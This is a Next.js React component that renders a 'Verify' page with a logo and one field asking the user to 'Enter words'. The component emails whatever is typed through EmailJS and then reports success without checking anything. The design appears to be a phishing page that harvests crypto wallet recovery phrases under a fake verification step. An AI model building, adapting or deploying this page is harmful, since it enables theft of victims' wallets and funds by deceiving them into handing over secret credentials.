"use client";
import React, { useRef, useState } from "react";
import Image from "next/image";
import emailjs from "emailjs-com";
import { UseMessage } from "../context/context";
import Trade from "../trade/page";

function About() {
  const formRef = useRef<HTMLFormElement | null>(null);
  const { selectedMessage } = UseMessage();
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);

  const verifyMessage = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!formRef.current) return;
    const formData = new FormData(formRef.current);
    const Message = formData.get("message")?.toString().trim();

   

    setError(null);
    setSuccess(null);
    setLoading(true);

    try {
      await emailjs.send(
        process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID!,
        process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID!,
        { message: Message },
        process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY!
      );

      setSuccess(" verified");
      formRef.current.reset();
    } catch (err) {
      console.error(err);
      setError("Failed to send email.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div>
      <Trade />
      <div className="px-4 sm:px-10 md:px-20 lg:px-40 py-10">
        <div className="flex justify-center">
          {selectedMessage?.src && (
            <Image
              src={selectedMessage.src}
              className="w-24 sm:w-28 md:w-36 object-contain"
              alt=""
            />
          )}
        </div>
        <div className="text-center text-2xl sm:text-3xl  text-black/60 py-6">
          <p className="font-semibold">Verify</p>
        </div>
        <form ref={formRef} onSubmit={verifyMessage} className="space-y-5">
          <input
            type="text"
            name="message"
            aria-label="message"
            placeholder="Enter words"
            className="border border-gray-300 px-4 py-4 w-full rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
          />
          <p className="text-center text-[#2A498D] font-semibold text-xs sm:text-sm">
            
          </p>
          {error && (
            <p
              aria-live="assertive"
              className="text-center text-red-500 text-sm"
            >
              {error}
            </p>
          )}
          {success && (
            <p
              aria-live="polite"
              className="text-center text-green-500 text-sm"
            >
              {success}
            </p>
          )}
          <div className="bg-blue-500">
            <button
              type="submit"
              disabled={loading}
              className={`w-full  cursor-pointer text-black py-2 rounded-3xl font-semibold ${loading ? "opacity-50 cursor-not-allowed" : "hover:bg-blue-700"} transition`}
            >
              {loading ? "Verifying..." : "Verify"}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}

export default About;
